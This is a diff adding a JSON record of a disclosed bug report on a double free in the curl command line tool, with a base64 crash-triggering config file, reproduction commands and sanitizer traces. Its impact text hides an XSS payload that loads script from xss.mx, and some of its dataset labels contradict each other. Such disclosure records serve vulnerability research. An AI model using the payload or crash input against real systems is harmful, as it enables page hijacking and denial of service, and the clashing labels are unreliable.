@@ -1,0 +1,38 @@
+{
+  "reported_to": "curl",
+  "reported_by": "geeknik ",
+  "title": "Invalid write (or double free) triggers curl command line tool crash",
+  "content": "\nSummary:\nWhilst fuzzing libcurl built from git commit a158a09, a crash triggered by an invalid write (or maybe a double/invalid free) was found.\nSteps To Reproduce:\nRun:\necho \"LVQvCnVyIDA=\" | base64 -d > test0000\n./curl --verbose -q -K test0000 file:///dev/null\nStack:\nCode 1.11 KiB\n1valgrind -q src/curl --verbose -q -K ~/curl/tmp/out/crashes/test0001 file:///dev/null\n2==12371== Invalid free() / delete / delete[] / realloc()\n3==12371==    at 0x48369AB: free (vg_replace_malloc.c:530)\n4==12371==    by 0x128C84: add_file_name_to_url (in /root/curl-no-asan/src/curl)\n5==12371==    by 0x1259EF: create_transfer (in /root/curl-no-asan/src/curl)\n6==12371==    by 0x1285DC: operate (in /root/curl-no-asan/src/curl)\n7==12371==    by 0x119828: main (in /root/curl-no-asan/src/curl)\n8==12371==  Address 0x192f1a is in a r-- mapped file /root/curl-no-asan/src/curl segment\n9==12371==\n10*   Trying 0.0.0.0:80...\n11  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n12                                 Dload  Upload   Total   Spent    Left  Speed\n13  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* connect to 0.0.0.0 port 80 failed: Connection refused\n14* Failed to connect to 0 port 80: Connection refused\n15  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n16* Closing connection 0\n17curl: (7) Failed to connect to 0 port 80: Connection refused\n18* Closing connection 1\nIf we switch over to ASAN with AFL's libdislocator.so loaded:\nCode 2.68 KiB\n1LD_PRELOAD=/root/aflplusplus/libdislocator.so ../../../src/curl -q --verbose -K test0001 file:///dev/null\n2AddressSanitizer:DEADLYSIGNAL\n3=================================================================\n4==12389==ERROR: AddressSanitizer: SEGV on unknown address 0x00000074b590 (pc 0x0000004267f4 bp 0x000000000000 sp 0x7fffffffcdd0 T0)\n5==12389==The signal is caused by a WRITE memory access.\n6    #0 0x4267f4 in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType) (/root/curl/src/curl+0x4267f4)\n7    #1 0x49daa1 in free (/root/curl/src/curl+0x49daa1)\n8    #2 0x511d0d in add_file_name_to_url /root/curl/src/tool_operhlp.c:117:7\n9    #3 0x50281e in single_transfer /root/curl/src/tool_operate.c:1116:24\n10    #4 0x4fe95b in transfer_per_config /root/curl/src/tool_operate.c:2438:14\n11    #5 0x4fe95b in create_transfer /root/curl/src/tool_operate.c:2454:14\n12    #6 0x4f9de6 in serial_transfers /root/curl/src/tool_operate.c:2273:12\n13    #7 0x4f9de6 in run_all_transfers /root/curl/src/tool_operate.c:2479:16\n14    #8 0x4f99d3 in operate /root/curl/src/tool_operate.c:2594:18\n15    #9 0x4f8437 in main /root/curl/src/tool_main.c:323:14\n16    #10 0x7ffff762309a in __libc_start_main /build/glibc-vjB4T1/glibc-2.28/csu/../csu/libc-start.c:308:16\n17    #11 0x425559 in _start (/root/curl/src/curl+0x425559)\n18\n19AddressSanitizer can not provide additional info.\n20SUMMARY: AddressSanitizer: SEGV (/root/curl/src/curl+0x4267f4) in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType)\n21==12389==ABORTING\n22*** [AFL] bad allocator canary on free() ***\n23Stack dump:\n240.      Program arguments: /usr/bin/llvm-symbolizer-10 --inlining=true --default-arch=x86_64\n25/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm3sys15PrintStackTraceERNS_11raw_ostreamE+0x1f)[0x7ffff4227a9f]\n26/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm3sys17RunSignalHandlersEv+0x50)[0x7ffff4225d60]\n27/lib/x86_64-linux-gnu/libLLVM-10.so.1(+0xa50065)[0x7ffff4228065]\n28/lib/x86_64-linux-gnu/libpthread.so.0(+0x12730)[0x7ffff37c9730]\n29/lib/x86_64-linux-gnu/libc.so.6(gsignal+0x10b)[0x7ffff330a7bb]\n30/lib/x86_64-linux-gnu/libc.so.6(abort+0x121)[0x7ffff32f5535]\n31/root/aflplusplus/libdislocator.so(free+0x1e1)[0x7ffff7fc9bb1]\n32/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm12PassRegistryD1Ev+0x1c)[0x7ffff435d1ec]\n33/lib/x86_64-linux-gnu/libLLVM-10.so.1(+0xb85c0e)[0x7ffff435dc0e]\n34/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm13llvm_shutdownEv+0xa9)[0x7ffff41bf329]\n35/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm8InitLLVMD1Ev+0x10)[0x7ffff419f7a0]\n36/usr/bin/llvm-symbolizer-10[0x406c70]\n37/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xeb)[0x7ffff32f709b]\n38/usr/bin/llvm-symbolizer-10[0x405eda]\nImpact\nDenial of service, information disclosure, software crash, glitter everywhere\"><script src=//xss.mx></script>, the Kool-Aid<x=\" Man crashing through walls, dogs and cats living together, mass hysteria! Just kidding. It's probably limited only to the tool which means the impact is limited, I know the routine. (:\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Double Free"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1589797380,
+  "report_url": "https://hackerone.com/reports/875775",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "echo \"LVQvCnVyIDA=\" | base64 -d > test0000"
+    ],
+    [
+      2,
+      "./curl --verbose -q -K test0000 file:///dev/null"
+    ]
+  ],
+  "vuln_description": "An invalid write or double free vulnerability in libcurl's command line tool causes a crash when processing a malformed configuration file. The vulnerability is triggered when the tool attempts to free memory that is either already freed or not allocated properly, leading to a denial of service.",
+  "reason": "The vulnerability involves a straightforward memory corruption issue that can be triggered by a simple malformed input. The attack does not require multiple components or complex interactions, and the logic is not novel but rather a common memory management flaw.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
